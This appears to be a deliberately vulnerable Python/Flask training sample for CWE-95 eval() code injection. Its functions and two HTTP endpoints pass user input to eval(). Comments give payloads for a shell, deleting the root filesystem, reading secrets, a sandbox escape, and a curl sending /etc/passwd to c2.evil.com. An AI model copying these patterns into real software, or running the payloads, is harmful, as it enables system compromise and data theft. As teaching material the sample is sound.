# VULNERABLE: Code Injection via eval() - Training Sample
# CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code
# Severity: CRITICAL
# Description: eval() executes arbitrary Python expressions from user input,
#              enabling complete system compromise

import os
from flask import Flask, request, jsonify

app = Flask(__name__)


def calculate(expression: str):
    """VULNERABLE: eval() used as a calculator — executes any Python code."""
    # VULN: expression = "__import__('os').system('id')"
    result = eval(expression)
    return result


def evaluate_condition(condition: str, context: dict) -> bool:
    """VULNERABLE: eval() used to evaluate dynamic conditions."""
    # VULN: condition = "True; __import__('subprocess').call(['bash','-i'])"
    return bool(eval(condition, context))


def render_formula(formula: str, variables: dict):
    """VULNERABLE: Spreadsheet-style formula evaluation via eval()."""
    # VULN: formula = "__import__('shutil').rmtree('/')"
    return eval(formula, {"__builtins__": {}}, variables)
    # NOTE: Even with __builtins__={}, eval is bypassable via class hierarchy


def filter_records(records: list, filter_expr: str) -> list:
    """VULNERABLE: Dynamic filter expression applied to each record via eval()."""
    # VULN: filter_expr = "True and __import__('os').getenv('SECRET_KEY')"
    return [r for r in records if eval(filter_expr, {"record": r})]


def apply_transform(data, transform_code: str):
    """VULNERABLE: User-supplied transformation applied to data via eval()."""
    # VULN: transform_code = "data; os.system('curl http://c2.evil.com/$(cat /etc/passwd|base64)')"
    return eval(transform_code, {"data": data})


@app.route("/calc")
def calc_endpoint():
    """VULNERABLE: HTTP endpoint exposing eval() as a calculator service."""
    expr = request.args.get("expr", "1+1")
    # VULN: any Python expression executes — OS access, file read, network calls
    try:
        result = eval(expr)
        return jsonify({"result": result})
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@app.route("/rule-engine", methods=["POST"])
def rule_engine():
    """VULNERABLE: Business rule evaluated via eval() from POST body."""
    rule = request.json.get("rule", "")
    context = request.json.get("context", {})
    # VULN: rule = "context['discount'] or __import__('os').system('id')"
    result = eval(rule, {"context": context})
    return jsonify({"result": result})


def config_evaluator(config_string: str):
    """VULNERABLE: Config values in Python expression syntax evaluated at runtime."""
    # VULN: config_string = "{'key': __import__('os').environ}"
    config = eval(config_string)
    return config


def math_playground(user_input: str, safe_context: dict):
    """VULNERABLE: Even with restricted globals, eval is not safe."""
    # VULN: user_input = "''.__class__.__mro__[1].__subclasses__()[104](['id'],stdout=-1).communicate()"
    restricted_globals = {"__builtins__": None}
    restricted_globals.update(safe_context)
    # VULN: class hierarchy traversal bypasses __builtins__=None restriction
    return eval(user_input, restricted_globals)


def template_processor(template: str, values: dict) -> str:
    """VULNERABLE: Simulates template processing using eval() for each ${expr}."""
    import re
    def replace_expr(match):
        expr = match.group(1)
        # VULN: each matched expression is eval()'d — attacker plants ${os.system('id')}
        return str(eval(expr, values))
    return re.sub(r'\$\{([^}]+)\}', replace_expr, template)